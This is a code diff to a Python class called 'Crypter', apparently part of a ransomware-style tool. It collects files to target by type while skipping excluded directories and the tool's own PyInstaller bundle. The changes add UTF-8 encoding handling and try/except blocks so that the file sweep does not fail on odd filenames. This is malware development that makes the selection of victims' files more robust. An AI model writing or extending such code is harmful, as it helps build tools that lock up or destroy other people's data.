@@ -23,6 +23,10 @@ import Gui
 from ScheduledTask import ScheduledTask 
 from TaskManager import TaskManager
 
+# Encoding
+reload(sys)
+sys.setdefaultencoding('utf8')
+
 
 ###################
 ## CRYPTER Class ##
@@ -325,25 +329,34 @@ class Crypter(Base.Base):
         for file in files:
           if os.path.isfile(os.path.join(path, file)):
             # Check file is valid
-            if (
-                (self.is_valid_filetype(file)) and
-                (not self.is_excluded_file(file)) and
-                (not self.is_excluded_dir(path)) and
-                (file.lower() != binary_name.lower()) and
-                (not os.path.join(path, file).lower().startswith(win32file.GetLongPathName(sys._MEIPASS).lower()))
-                ):
-                    file_list.append(os.path.join(path, file))
+            try:
+              if (
+                  (self.is_valid_filetype(file)) and
+                  (not self.is_excluded_file(file)) and
+                  (not self.is_excluded_dir(path)) and
+                  (file.lower() != binary_name.lower()) and
+                  (not os.path.join(path, file).lower().startswith(win32file.GetLongPathName(sys._MEIPASS).lower()))
+                  ):
+                      file_list.append(os.path.join(path, file))
+            except Exception:
+                # Skip any files with strange chars not within our encoding
+                pass
         for file in subdirs:
           if os.path.isfile(os.path.join(path, file)):
             # Check file is valid
-            if (
-                (self.is_valid_filetype(file)) and
-                (not self.is_excluded_file(file)) and
-                (not self.is_excluded_dir(path)) and
-                (file.lower() != binary_name.lower()) and
-                (not os.path.join(path, file).lower().startswith(win32file.GetLongPathName(sys._MEIPASS).lower()))
-                ):
-                    file_list.append(os.path.join(path, file))
+            try:
+              if (
+                  (self.is_valid_filetype(file)) and
+                  (not self.is_excluded_file(file)) and
+                  (not self.is_excluded_dir(path)) and
+                  (file.lower() != binary_name.lower()) and
+                  (not os.path.join(path, file).lower().startswith(win32file.GetLongPathName(sys._MEIPASS).lower()))
+                  ):
+                      file_list.append(os.path.join(path, file))
+            except Exception:
+                # Skip any files with strange chars not within our encoding
+                pass
+
 
 
     return file_list
